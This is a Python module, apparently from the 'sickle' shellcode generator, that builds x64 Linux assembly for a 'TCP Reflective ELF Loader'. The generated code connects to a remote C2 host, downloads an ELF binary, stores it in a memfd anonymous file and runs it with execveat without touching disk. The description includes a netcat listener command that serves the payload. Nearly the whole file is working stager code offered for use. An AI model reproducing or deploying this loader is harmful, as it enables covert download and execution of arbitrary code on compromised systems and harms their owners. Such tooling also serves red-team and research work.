import sys
import math
import ctypes
import struct

from sickle.common.lib.generic import extract
from sickle.common.lib.generic import convert 
from sickle.common.lib.generic import modparser
from sickle.common.lib.reversing import mappings 
from sickle.common.lib.programmer import builder 

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.linux import (
    memfd,
    fcntl,
    netinet_in,    
    bits_socket,
    bits_mman_linux,
    bits_mman_shared,
)

class Shellcode():

    arch = "x64"

    platform = "linux"

    name = "Linux (x64) TCP Reflective ELF Loader"

    module = f"{platform}/{arch}/memfd_reflective_elf_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=42 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Debian 13.2.0-25",
                        "Ubuntu 18.04.6 LTS"]

    summary = ("Staged Reflective ELF Loader via TCP over IPV4 which executes an ELF from"
               " a remote server")

    description = ("TCP based reflective ELF loader over IPV4 that will connect to a remote C2 server"
                   " and download an ELF. Once downloaded, an anonymous file will be created to store"
                   " the ELF file. Upon completion, it will execute in memory without touching disk.\n\n"

                   "As an example, your \"C2 Server\" can be as simple as Netcat:\n\n"

                   "    nc -w 15 -lvp 42 < payload\n\n"

                   "Then you can you generate the shellcode accordingly:\n\n"

                   f"    {example_run}\n\n"

                   "Upon execution of the shellcode, you should get a connection from the target and"
                   " your ELF should execute in memory.")

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["ACK_PACKET"] = {}
    arguments["ACK_PACKET"]["optional"] = "yes"
    arguments["ACK_PACKET"]["description"] = "File including it's path containing the acknowledgement packet response"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.sock_buffer_size = 0x500

        sc_args = {
            "mapping"    : 0x00,
            "sockfd"     : 0x00,
            "addr"       : 0x10,
            "buffer"     : self.get_ackpk_len(),
            "readBuffer" : self.sock_buffer_size,
            "out"        : 0x00,
            "elf_size"   : 0x00,
            "anon_file"  : 0x00,
            "anonfd"     : 0x00,
            "pathname"   : 0x00,
        }

        self.syscalls = mappings.get_linux_syscalls(["mmap",
                                                     "socket",
                                                     "connect",
                                                     "write",
                                                     "read",
                                                     "mremap",
                                                     "memfd_create",
                                                     "execveat"])

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

    def get_ackpk_len(self):
        """Generates the size needed by the ACK packet sent to the C2 server.
        Due to bugs encountered when passing raw strings, this function will
        read from a file. In addition, it instantiates self.ack_packet.
        Should no file be provided, a default string will be sent over TCP
        instead.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("ACK_PACKET" not in argv_dict.keys()):
            self.ack_packet = None
            needed_space = 0x00
        else:
            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACK_PACKET"], 'r')
            needed_space = math.ceil(len(self.ack_packet)/8) * 8

        return needed_space

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
        sin_port = struct.pack('<H', lport).hex()
        sin_family = struct.pack('>H', bits_socket.AF_INET).hex()

        source_code = f"""
_start:
    push rbp
    mov rbp, rsp
    sub rsp, {self.stack_space}

create_allocation:
    ; RAX => mmap(void addr[.length], // RDI
    ;             size_t length,      // RSI
    ;             int prot,           // RDX
    ;             int flags,          // R10
    ;             int fd,             // R8
    ;             off_t offset);      // R9
    xor rdi, rdi
    mov rsi, 0x500
    xor rdx, rdx
    add dl, {bits_mman_linux.PROT_READ | bits_mman_linux.PROT_WRITE}
    xor r10, r10
    mov r10b, {bits_mman_linux.MAP_PRIVATE | bits_mman_linux.MAP_ANONYMOUS}
    xor r8, r8
    dec r8
    xor r9, r9
    xor rax, rax
    mov al, {self.syscalls['mmap']}
    syscall
    test rax, rax
    je exit
    mov [rbp - {self.storage_offsets['mapping']}], rax

create_sockfd:
    ; RAX => socket(int domain,    // RDI
    ;               int type,      // RSI
    ;               int protocol); // RDX
    mov rdi, {bits_socket.AF_INET}
    mov rsi, {bits_socket.SOCK_STREAM}
    mov rdx, {netinet_in.IPPROTO_TCP}
    mov rax, {self.syscalls['socket']}
    syscall
    mov [rbp - {self.storage_offsets['sockfd']}], rax

connect:
    ; RAX => connect(int sockfd,                  // RDI
    ;                const struct sockaddr *addr, // RSI
    ;                socklen_t addrlen;           // RDX
    mov rdi, [rbp - {self.storage_offsets['sockfd']}]
    mov rsi, {sin_addr}{sin_port}{sin_family}
    mov [rbp - {self.storage_offsets['addr']}], rsi
    lea rsi, [rbp - {self.storage_offsets['addr']}]
    xor rax, rax
    mov [rsi+8], rax
    mov rdx, 0x10
    mov rax, {self.syscalls['connect']}
    syscall
        """

        if self.ack_packet != None:
            packet_buffer = convert.from_str_to_xwords(self.ack_packet)
            write_index = self.storage_offsets['buffer']

            source_code += "\ninit_download:\n"

            for i in range(len(packet_buffer["QWORD_LIST"])):
                source_code += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
                source_code += "    mov [rbp-{}], rcx\n".format(hex(write_index))
                write_index -= 8

            for i in range(len(packet_buffer["DWORD_LIST"])):
                source_code += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
                source_code += "    mov [rbp-{}], ecx\n".format(hex(write_index))
                write_index -= 4

            for i in range(len(packet_buffer["WORD_LIST"])):
                source_code += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
                source_code += "    mov [rbp-{}], cx\n".format(hex(write_index))
                write_index -= 2

            for i in range(len(packet_buffer["BYTE_LIST"])):
                source_code += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
                source_code += "    mov [rbp-{}], cl\n".format(hex(write_index))
                write_index -= 1

            source_code += f"""
    ; RAX = write(int fd,                 // RAX
    ;             const void buf[.count], // RSI
    ;             size_t count);          // RDX
    xor rcx, rcx
    mov [rbp-{write_index}], cl
    mov rdi, [rbp - {self.storage_offsets['sockfd']}]
    lea rsi, [rbp - {self.storage_offsets['buffer']}]
    mov rdx, {len(self.ack_packet)}
    mov rax, {self.syscalls['write']}
    syscall
            """
        
        source_code += f"""
set_index:
    xor r14, r14

download_stager:
    ; RAX => read(int fd,        // RDI
    ;             void *buf      // RSI
    ;             size_t count); // RDX
    mov rdi, [rbp - {self.storage_offsets['sockfd']}]
    lea rsi, [rbp - {self.storage_offsets['readBuffer']}]
    mov rdx, {self.sock_buffer_size}
    mov rax, {self.syscalls['read']}
    syscall

    test rax, rax
    jz download_complete

adjust_allocation:
    mov r15, [rbp - {self.storage_offsets['mapping']}]
    mov r12, rax
    lea r9, [rbp - {self.storage_offsets['readBuffer']}]

write_data:
    mov r10b, [r9]
    mov [r15 + r14], r10b
    inc r14
    inc r9
    dec rax
    test rax, rax
    jnz write_data

check_size:
    cmp r12, 0x00
    je download_complete    


realloc:
    ; RAX => mremap(void old_address,    // RDI
    ;               size_t old_size,     // RSI
    ;               size_t new_size,     // RDX
    ;               int flags,           // R10
    ;               void *new_address);  // R8 
    mov rdi, [rbp - {self.storage_offsets['mapping']}]
    mov rsi, r14
    mov r13, r14
    add r13, {self.sock_buffer_size}
    mov rdx, r13
    mov r10, {bits_mman_shared.MREMAP_MAYMOVE}
    lea r8, [rbp - {self.storage_offsets['out']}]
    mov rax, {self.syscalls['mremap']}
    syscall

    mov [rbp - {self.storage_offsets['mapping']}], rax

    jmp download_stager

download_complete:
    mov [rbp - {self.storage_offsets['elf_size']}], r14

create_memory_file:
    ; RAX => memfd_create(const char *name,    // RDI
    ;                     unsigned int flags); // RSI
    xor rax,rax
    lea rdi, [rbp - {self.storage_offsets['anon_file']}]
    mov [rdi], rax
    mov dword ptr [rdi], 0x41414141

    mov rsi, {memfd.MFD_CLOEXEC}
    mov rax, {self.syscalls['memfd_create']}
    syscall
    mov [rbp - {self.storage_offsets['anonfd']}], rax

write_to_file:
    ; RAX = write(int fd,                  // RDI
    ;             const void buf[.count],  // RSI
    ;             size_t count);           // RDX
    mov rdi, [rbp - {self.storage_offsets['anonfd']}]
    mov rsi, [rbp - {self.storage_offsets['mapping']}]
    mov rdx, [rbp - {self.storage_offsets['elf_size']}]
    mov rax, {self.syscalls['write']}
    syscall

execute_elf:
    ; RAX = execveat(int dirfd,                     // RDI
    ;                const char *pathname,          // RSI
    ;                char *const _Nullable argv[],  // RDX
    ;                char *const _Nullable envp[],  // R10
    ;                int flags);                    // R8
    xor rax, rax
    mov rdi, [rbp - {self.storage_offsets['anonfd']}]
    lea rsi, [rbp - {self.storage_offsets['pathname']}]
    mov [rsi], rax
    mov r8, {fcntl.AT_EMPTY_PATH}
    lea r10, [rbp - {self.storage_offsets['readBuffer']}]
    mov rdx, r10
    mov [r10], rax
    mov rax, {self.syscalls['execveat']}
    syscall
exit:
    xor rax, rax
    leave
    ret
        """

        return source_code

    def get_shellcode(self):

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
